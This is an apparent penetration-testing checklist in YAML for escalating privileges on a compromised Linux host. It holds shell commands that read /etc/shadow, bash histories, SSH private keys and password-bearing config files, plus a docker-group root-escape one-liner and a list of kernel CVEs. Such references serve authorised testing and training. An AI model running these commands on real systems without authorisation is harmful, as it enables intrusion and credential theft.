---
display_name: "Linux PrivEsc Checklist"
description: |
  Linux privilege escalation checklist — run these fast checks top to bottom after landing a shell.
  Each positive result links to the specific technique entry. Stop and exploit the first win you find.
commands:
  - have: Shell
    cmd: |
      # ════════════════════════════════════════════════════════════════
      # PHASE 1 — WHO AM I / SITUATIONAL AWARENESS
      # ════════════════════════════════════════════════════════════════

      # current user, UID, GID, and all group memberships
      id

      # full login name and home directory
      whoami && echo $HOME

      # OS and kernel version — needed for CVE selection
      uname -a
      cat /etc/os-release

      # check which shell and environment you have
      echo $SHELL && env

      # other users with a login shell — potential lateral targets
      cat /etc/passwd | grep -v "nologin\|false"

      # ════════════════════════════════════════════════════════════════
      # PHASE 2 — SUDO  →  Linux-SUID-Sudo.md
      # ════════════════════════════════════════════════════════════════

      # list what the current user can run with sudo — the single most important check
      sudo -l

      # NOPASSWD entry → immediate root without a password
      # sudo <binary> → check GTFOBins for that binary
      # sudo ALL → instant root: sudo su -
      # env_keep LD_PRELOAD → LD_PRELOAD hijack  →  LD-PRELOAD-Hijack.md

      # try sudo without a password (may work if misconfigured)
      sudo -n whoami 2>/dev/null

      # ════════════════════════════════════════════════════════════════
      # PHASE 3 — SUID / SGID BINARIES  →  Linux-SUID-Sudo.md
      # ════════════════════════════════════════════════════════════════

      # find all SUID binaries — compare each against GTFOBins
      find / -perm -4000 -type f 2>/dev/null

      # find all SGID binaries
      find / -perm -2000 -type f 2>/dev/null

      # interesting SUID binaries to check: find, bash, python, perl, nmap, vim, less, more,
      # cp, mv, awk, env, tee, dd, cat, man, ftp, php, ruby, lua, node, git, screen

      # ════════════════════════════════════════════════════════════════
      # PHASE 4 — CAPABILITIES  →  Linux-Capabilities.md
      # ════════════════════════════════════════════════════════════════

      # find binaries with elevated Linux capabilities
      getcap -r / 2>/dev/null

      # dangerous capabilities to look for:
      # cap_setuid  → escalate to any UID  →  Linux-Capabilities.md
      # cap_net_raw → raw socket access (sniff traffic)
      # cap_dac_read_search → read any file (bypass DAC)
      # cap_sys_ptrace → inject into any process
      # cap_sys_admin → near-root — mount, namespace manipulation

      # ════════════════════════════════════════════════════════════════
      # PHASE 5 — CRON JOBS  →  Linux-Cron-Hijack.md
      # ════════════════════════════════════════════════════════════════

      # system-wide cron jobs — check for scripts writable by current user
      cat /etc/crontab
      ls -la /etc/cron.* /var/spool/cron/crontabs/ 2>/dev/null

      # all cron-related files in common locations
      find /etc/cron* /var/spool/cron* -type f 2>/dev/null

      # check if a cron script is writable
      ls -la /path/to/cron/script.sh

      # watch for new processes spawned by cron (detects scripts not in crontab)
      watch -n 1 "ps aux --sort=start_time | tail -20"

      # use pspy to monitor processes without root (best tool for cron detection)
      ./pspy64

      # ════════════════════════════════════════════════════════════════
      # PHASE 6 — WRITABLE SERVICE FILES  →  Linux-Writable-Services.md
      # ════════════════════════════════════════════════════════════════

      # find systemd unit files writable by current user
      find /etc/systemd /lib/systemd /usr/lib/systemd -type f -writable 2>/dev/null

      # find service binaries/scripts that run as root and are writable
      systemctl list-units --type=service --state=running
      # for each interesting service:
      systemctl cat <service-name>   # shows the binary path
      ls -la /path/to/service/binary

      # ════════════════════════════════════════════════════════════════
      # PHASE 7 — LD_PRELOAD HIJACK  →  LD-PRELOAD-Hijack.md
      # ════════════════════════════════════════════════════════════════

      # check if sudo preserves LD_PRELOAD (look for env_keep+=LD_PRELOAD in sudo -l output)
      sudo -l | grep LD_PRELOAD

      # if present: compile a malicious shared library and inject it via sudo
      # see LD-PRELOAD-Hijack.md for full exploit chain

      # ════════════════════════════════════════════════════════════════
      # PHASE 8 — PATH HIJACKING / PYTHON LIBRARY HIJACK
      #           →  Python-Library-Hijack.md
      # ════════════════════════════════════════════════════════════════

      # check PATH for writable directories at the front (attacker-controlled binary runs first)
      echo $PATH
      for dir in $(echo $PATH | tr ':' ' '); do ls -ld "$dir" 2>/dev/null; done

      # find scripts run by root that call binaries without full path
      # if you can write to a directory earlier in PATH, drop a malicious binary with the same name

      # check python path for writable site-packages (python library hijack)
      python3 -c "import sys; print('\n'.join(sys.path))"
      find / -name "*.py" -writable 2>/dev/null | grep -v proc

      # ════════════════════════════════════════════════════════════════
      # PHASE 9 — WILDCARD INJECTION  →  Wildcard-Injection.md
      # ════════════════════════════════════════════════════════════════

      # look for cron or scripts running tar, rsync, chown, chmod with wildcards in writable dirs
      grep -r "\*" /etc/cron* /var/spool/cron* 2>/dev/null | grep -E "tar|rsync|chown|chmod"

      # if tar --wildcard or rsync used on a directory you can write to → inject --checkpoint-action
      # see Wildcard-Injection.md for full technique

      # ════════════════════════════════════════════════════════════════
      # PHASE 10 — INTERESTING FILES / STORED CREDENTIALS
      # ════════════════════════════════════════════════════════════════

      # SSH private keys — look for id_rsa, id_ed25519, etc.
      find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null

      # bash history — may contain passwords passed as CLI arguments
      cat ~/.bash_history
      find / -name ".bash_history" -readable 2>/dev/null | xargs cat 2>/dev/null

      # config files with credentials
      find / -name "*.conf" -o -name "*.config" -o -name "*.env" 2>/dev/null | xargs grep -li "password\|passwd\|secret\|key" 2>/dev/null

      # database credentials
      find / -name "wp-config.php" -o -name "database.yml" -o -name ".env" 2>/dev/null | xargs grep -i "pass\|secret" 2>/dev/null

      # check if /etc/shadow is readable (misconfigured permissions)
      cat /etc/shadow 2>/dev/null

      # check if /etc/passwd is writable — can add a root user with known password hash
      ls -la /etc/passwd

      # readable backup files that may contain hashes
      find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null | xargs ls -la 2>/dev/null

      # ════════════════════════════════════════════════════════════════
      # PHASE 11 — RUNNING PROCESSES / INTERNAL SERVICES
      # ════════════════════════════════════════════════════════════════

      # processes running as root — look for exploitable services or scripts
      ps aux | grep root | grep -v "\[" | grep -v grep

      # listening ports not exposed externally — internal services to exploit or tunnel to
      ss -tlnp
      netstat -tlnp 2>/dev/null

      # port forward an internal service to your attack machine
      # ssh -L 8080:127.0.0.1:8080 user@target   (if SSH creds available)
      # see Pivoting-Tunneling.md for more

      # ════════════════════════════════════════════════════════════════
      # PHASE 12 — SPECIAL GROUP MEMBERSHIP
      # ════════════════════════════════════════════════════════════════

      # check all groups of current user
      id

      # docker group → mount host filesystem into container → read/write as root  →  Docker-Escape.md
      # lxd/lxc group → create privileged container → mount host FS  →  Docker-Escape.md
      # disk group → direct access to raw disk device → read /etc/shadow without root
      # adm group → read /var/log/* — may contain credentials or session data
      # shadow group → read /etc/shadow directly
      # video group → read framebuffer (screenshot the desktop)
      # sudo/wheel group → sudo access

      # if in docker group:
      docker run -v /:/mnt --rm -it alpine chroot /mnt sh

      # if in disk group — read raw disk for sensitive files
      debugfs /dev/sda1
      # then: cat /etc/shadow

      # if in lxd group  →  Docker-Escape.md for full technique

      # ════════════════════════════════════════════════════════════════
      # PHASE 13 — NFS  →  Linux-NFS-Abuse.md
      # ════════════════════════════════════════════════════════════════

      # check for NFS shares with no_root_squash (root on client = root on share)
      cat /etc/exports 2>/dev/null

      # list mountable NFS shares from the target
      showmount -e 10.10.10.27

      # ════════════════════════════════════════════════════════════════
      # PHASE 14 — KERNEL EXPLOITS  →  Linux-Kernel-Exploit.md
      # ════════════════════════════════════════════════════════════════

      # get exact kernel version for CVE lookup
      uname -r

      # common kernel exploits to check (match against uname -r):
      # DirtyPipe     CVE-2022-0847  kernels 5.8–5.16
      # DirtyCow      CVE-2016-5195  kernels < 4.8.3
      # PwnKit        CVE-2021-4034  pkexec — distro-independent
      # Baron Samedit CVE-2021-3156  sudo < 1.9.5p2

      # check sudo version for Baron Samedit
      sudo --version

      # check pkexec for PwnKit (exists and is SUID = likely vulnerable on old systems)
      ls -la /usr/bin/pkexec

      # ════════════════════════════════════════════════════════════════
      # PHASE 15 — AUTOMATED SCANNERS (run last — noisy)
      # ════════════════════════════════════════════════════════════════

      # LinPEAS — comprehensive automated PrivEsc enumeration
      ./linpeas.sh

      # LinEnum — alternative automated enumeration
      ./LinEnum.sh

      # LSE (Linux Smart Enumeration) — quieter, level 1 for quick scan
      ./lse.sh -l 1

      # pspy — monitor process activity without root (best for spotting cron and root scripts)
      ./pspy64
phase:
  - PrivEsc
target_os:
  - Linux
services: []
techniques: []
references:
  - https://github.com/peass-ng/PEASS-ng
  - https://github.com/rebootuser/LinEnum
  - https://github.com/diego-treitos/linux-smart-enumeration
  - https://github.com/DominicBreuker/pspy
  - https://gtfobins.github.io/
  - https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
---
